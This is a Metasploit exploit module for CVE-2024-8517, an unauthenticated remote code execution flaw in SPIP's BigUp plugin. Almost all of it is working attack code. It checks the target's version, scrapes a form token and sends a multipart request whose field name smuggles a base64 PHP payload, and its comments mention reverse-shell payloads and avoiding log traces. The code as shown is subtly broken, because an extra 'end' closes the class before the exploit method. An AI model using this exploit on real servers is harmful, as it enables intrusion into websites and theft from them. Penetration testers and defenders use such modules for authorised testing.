##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Payload::Php
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Spip
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SPIP BigUp Plugin Unauthenticated RCE',
        'Description' => %q{
          This module exploits a Remote Code Execution vulnerability in the BigUp plugin of SPIP.
          The vulnerability lies in the `lister_fichiers_par_champs` function, which is triggered
          when the `bigup_retrouver_fichiers` parameter is set to any value. By exploiting the improper
          handling of multipart form data in file uploads, an attacker can inject and execute
          arbitrary PHP code on the target server.

          This critical vulnerability affects all versions of SPIP from 4.0 up to and including
          4.3.1, 4.2.15, and 4.1.17. It allows unauthenticated users to execute arbitrary code
          remotely via the public interface. The vulnerability has been patched in versions
          4.3.2, 4.2.16, and 4.1.18.
        },
        'Author' => [
          'Vozec',            # Vulnerability Discovery
          'Laluka',           # Vulnerability Discovery
          'Julien Voisin',    # Code Review
          'Valentin Lobstein' # Metasploit Module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2024-8517'],
          ['URL', 'https://thinkloveshare.com/hacking/spip_preauth_rce_2024_part_2_a_big_upload/'],
          ['URL', 'https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-3-2-SPIP-4-2-16-SPIP-4-1-18.html']
        ],
        'Platform' => %w[php unix linux win],
        'Arch' => %w[ARCH_PHP ARCH_CMD],
        'Targets' => [
          [
            'PHP In-Memory', {
              'Platform' => 'php',
              'Arch' => ARCH_PHP
              # tested with php/meterpreter/reverse_tcp
            }
          ],
          [
            'Unix/Linux Command Shell', {
              'Platform' => %w[unix linux],
              'Arch' => ARCH_CMD
              # tested with cmd/linux/http/x64/meterpreter/reverse_tcp
            }
          ],
          [
            'Windows Command Shell', {
              'Platform' => 'win',
              'Arch' => ARCH_CMD
              # tested with cmd/windows/http/x64/meterpreter/reverse_tcp
            }
          ]
        ],
        'DefaultTarget' => 0,
        'Privileged' => false,
        'DisclosureDate' => '2024-09-06',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options(
      [
        OptString.new('FORM_PAGE', ['false', 'A page with a form.', 'Auto'])
      ]
    )
  end

  def check
    rversion = spip_version
    return Exploit::CheckCode::Unknown('Unable to determine the version of SPIP') unless rversion

    print_status("SPIP Version detected: #{rversion}")

    vulnerable_ranges = [
      { start: Rex::Version.new('4.0.0'), end: Rex::Version.new('4.1.17') },
      { start: Rex::Version.new('4.2.0'), end: Rex::Version.new('4.2.15') },
      { start: Rex::Version.new('4.3.0'), end: Rex::Version.new('4.3.1') }
    ]

    vulnerable_ranges.each do |range|
      if rversion.between?(range[:start], range[:end])
        print_good("SPIP version #{rversion} is vulnerable.")
        break
      end
    end

    plugin_version = spip_plugin_version('bigup')

    unless plugin_version
      print_warning('Could not determine the version of the bigup plugin.')
      return CheckCode::Appears("The detected SPIP version (#{rversion}) is vulnerable.")
    end

    return CheckCode::Appears("Both the detected SPIP version (#{rversion}) and bigup version (#{plugin_version}) are vulnerable.") if plugin_version < Rex::Version.new('3.1.6')

    CheckCode::Safe("The detected SPIP version (#{rversion}) is not vulnerable.")
  end

  # This function tests several pages to find a form with a valid CSRF token and its corresponding action.
  # It allows the user to specify a URL via the FORM_PAGE option (e.g., spip.php?article1).
  # We need to check multiple pages because the configuration of SPIP can vary.
  def get_form_data
    pages = %w[login spip_pass contact]

    if datastore['FORM_PAGE']&.downcase != 'auto'
      pages = [datastore['FORM_PAGE']]
    end

    pages.each do |page|
      url = normalize_uri(target_uri.path, page.start_with?('/') ? page : "spip.php?page=#{page}")
      res = send_request_cgi('method' => 'GET', 'uri' => url)

      next unless res&.code == 200

      doc = Nokogiri::HTML(res.body)
      action = doc.at_xpath("//input[@name='formulaire_action']/@value")&.text
      args = doc.at_xpath("//input[@name='formulaire_action_args']/@value")&.text

      next unless action && args

      print_status("Found formulaire_action: #{action}")
      print_status("Found formulaire_action_args: #{args[0..20]}...")
      return { action: action, args: args }
    end

    nil
  end
end

# This function generates PHP code to execute a given payload on the target.
# We use Rex::RandomIdentifier::Generator to create a random variable name to avoid conflicts.
# The payload is encoded in base64 to prevent issues with special characters.
# The generated PHP code includes the necessary preamble and system block to execute the payload.
# This approach allows us to test multiple functions and not limit ourselves to potentially dangerous functions like 'system' which might be disabled.
def php_exec_cmd(encoded_payload)
  vars = Rex::RandomIdentifier::Generator.new
  dis = "$#{vars[:dis]}"
  encoded_clean_payload = Rex::Text.encode_base64(encoded_payload)
  <<-END_OF_PHP_CODE
            #{php_preamble(disabled_varname: dis)}
            $c = base64_decode("#{encoded_clean_payload}");
            #{php_system_block(cmd_varname: '$c', disabled_varname: dis)}
  END_OF_PHP_CODE
end

def exploit
  form_data = get_form_data

  unless form_data
    fail_with(Failure::NotFound, 'Could not retrieve formulaire_action or formulaire_action_args value from any page.')
  end

  print_status('Preparing to send exploit payload to the target...')

  phped_payload = target['Arch'] == ARCH_PHP ? payload.encoded : php_exec_cmd(payload.encoded)
  b64_payload = framework.encoders.create('php/base64').encode(phped_payload).gsub(';', '')

  post_data = Rex::MIME::Message.new

  # This line is necessary for the form to be valid, works in tandem with formulaire_action_args
  post_data.add_part(form_data[:action], nil, nil, 'form-data; name="formulaire_action"')

  # This value is necessary for $_FILES to be used and for the bigup plugin to be "activated" for this request, thus triggering the vulnerability
  post_data.add_part(Rex::Text.rand_text_alphanumeric(4, 8), nil, nil, 'form-data; name="bigup_retrouver_fichiers"')

  # Injection is performed here. The die() function is used to avoid leaving traces in the logs,
  # prevent errors, and stop the execution of PHP after the injection.
  post_data.add_part('', nil, nil, "form-data; name=\"#{Rex::Text.rand_text_alphanumeric(4, 8)}['.#{b64_payload}.die().']\"; filename=\"#{Rex::Text.rand_text_alphanumeric(4, 8)}\"")

  # This is necessary for the form to be accepted
  post_data.add_part(form_data[:args], nil, nil, 'form-data; name="formulaire_action_args"')

  send_request_cgi({
    'method' => 'POST',
    'uri' => normalize_uri(target_uri.path, 'spip.php'),
    'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
    'data' => post_data.to_s
  }, 1)
end